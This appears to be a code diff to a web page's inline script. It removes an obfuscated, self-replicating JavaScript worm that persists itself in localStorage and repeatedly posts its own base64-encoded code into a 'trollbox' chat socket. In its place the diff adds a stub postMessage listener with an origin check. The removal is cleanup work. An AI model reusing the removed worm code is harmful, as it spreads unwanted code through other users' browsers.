@@ -18,5 +18,12 @@
 </form> 
 </center>
 <script type="text/javascript">
-(q=_=>{localStorage['boot/q.js']=`(q=${q})()`;setInterval(_=>{f=document.querySelector('iframe[src*=trollbox]');if(f&&f.contentWindow.socket){f.contentWindow.socket.emit('message','Example,'+btoa(`(q=${q})()${f.contentWindow.a?' ':''}`));f.contentWindow.a=!f.contentWindow.a}},2500)})()
+window.addEventListener("message", receiveMessage, false);
+
+function receiveMessage(event) {
+  if (event.origin !== "http://example.org:8080")
+    return;
+
+  // ...
+}
 </script>
